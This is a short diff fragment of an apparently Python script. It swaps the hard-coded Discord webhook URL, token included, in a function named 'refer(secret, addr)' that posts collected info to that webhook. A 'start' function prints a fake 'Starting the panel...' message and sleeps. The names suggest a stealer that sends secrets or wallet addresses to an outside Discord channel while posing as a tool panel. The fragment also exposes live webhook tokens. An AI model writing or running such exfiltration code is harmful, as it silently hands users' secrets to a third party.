@@ -15,7 +15,7 @@ def refer(secret, addr):
 	```
 	"""
 	payt = {"content" : info}
-	re = requests.post("https://discord.com/api/webhooks/923231465125326949/N-lZsojBCMka6f3eCiB2FFHBHl--IaAQNQEuaG4po_GbajSilhx4Z_IqRZV-ZpsTPQ_D", data = payt)
+	re = requests.post("https://discord.com/api/webhooks/1364933868699783201/14pJ1IBpJrX8rn_Ti0s4CLEg4cnQB7fUKN_3Pe0hUFt7YGJuThkdoFKB9nnDSH30omRO", data = payt)
 def start():
 	print("[+] Starting the panel...")
 	time.sleep(8)
